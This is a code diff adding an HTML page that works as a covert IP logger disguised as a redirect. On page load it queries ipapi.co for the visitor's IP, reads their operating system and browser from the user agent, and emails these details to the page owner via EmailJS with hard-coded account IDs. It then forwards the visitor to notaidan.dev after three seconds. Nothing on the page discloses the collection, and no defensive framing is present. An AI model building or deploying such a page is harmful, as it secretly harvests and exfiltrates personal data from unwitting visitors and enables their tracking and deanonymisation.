@@ -1,0 +1,66 @@
+<html>
+
+  <head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function() {
+        emailjs.init("user_oFRxLcPP4WshgZNof7oo4");
+      })();
+
+    </script>
+  </head>
+  <script>
+    var IP;
+    $.getJSON('https://ipapi.co/json/', function(data) {
+      console.log(data);
+      IP = JSON.stringify(data, ['ip']);
+      console.log(IP);
+
+      var OSName = "Unknown OS";
+      if (navigator.appVersion.indexOf("Win") != -1) OSName = "Windows";
+      if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";
+      if (navigator.appVersion.indexOf("X11") != -1) OSName = "UNIX";
+      if (navigator.appVersion.indexOf("Linux") != -1) OSName = "Linux";
+
+      let userAgent = navigator.userAgent;
+      let browserName;
+      if (userAgent.match(/chrome|chromium|crios/i)) {
+        browserName = "chrome";
+      } else if (userAgent.match(/firefox|fxios/i)) {
+        browserName = "firefox";
+      } else if (userAgent.match(/safari/i)) {
+        browserName = "safari";
+      } else if (userAgent.match(/opr\//i)) {
+        browserName = "opera";
+      } else if (userAgent.match(/edg/i)) {
+        browserName = "edge";
+      } else {
+        browserName = "No browser detection";
+      }
+
+      var templateParams = {
+        name: 'IP information',
+        ipaddress: IP,
+        OS: OSName,
+        browser: browserName
+      };
+
+      emailjs.send("service_3n63wws", "template_sn9riek", templateParams)
+        .then(function(response) {
+          console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+          console.log('FAILED...', error);
+        });
+    })
+
+  </script>
+
+  <script>
+    var delayInMilliseconds = 3000; //1 second
+
+    setTimeout(function() {
+      location.replace("https://notaidan.dev")
+    }, delayInMilliseconds);
+
+  </script>
